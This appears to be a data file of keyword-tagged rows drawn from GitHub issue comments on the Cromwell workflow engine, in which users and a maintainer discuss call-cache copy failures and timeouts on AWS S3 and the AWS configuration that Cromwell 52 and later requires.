nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:105,Availability,error,error,105,"I have moved to cromwell v53.1 now. However the caching still doesn't work for me. I consistently get an error like this:. > 2020-11-07 17:54:51,634 cromwell-system-akka.dispatchers.engine-dispatcher-35 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Fa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:336,Availability,Failure,Failure,336,"I have moved to cromwell v53.1 now. However the caching still doesn't work for me. I consistently get an error like this:. > 2020-11-07 17:54:51,634 cromwell-system-akka.dispatchers.engine-dispatcher-35 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Fa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:1514,Availability,failure,failures,1514," RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Ge",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2911,Availability,Error,Error,2911,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2922,Availability,Failure,Failure,2922,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2116,Deployability,update,updated,2116,"S_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxx",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2341,Deployability,release,release,2341,"cher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba02308",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2414,Deployability,configurat,configuration,2414,"cher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba02308",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2497,Deployability,Install,Installing,2497,"es before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVaria",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:462,Modifiability,Enhance,EnhancedCromwellIoException,462,"I have moved to cromwell v53.1 now. However the caching still doesn't work for me. I consistently get an error like this:. > 2020-11-07 17:54:51,634 cromwell-system-akka.dispatchers.engine-dispatcher-35 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Fa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2414,Modifiability,config,configuration,2414,"cher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba02308",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2795,Modifiability,config,config,2795,"S_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:352,Performance,cache,cache,352,"I have moved to cromwell v53.1 now. However the caching still doesn't work for me. I consistently get an error like this:. > 2020-11-07 17:54:51,634 cromwell-system-akka.dispatchers.engine-dispatcher-35 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). 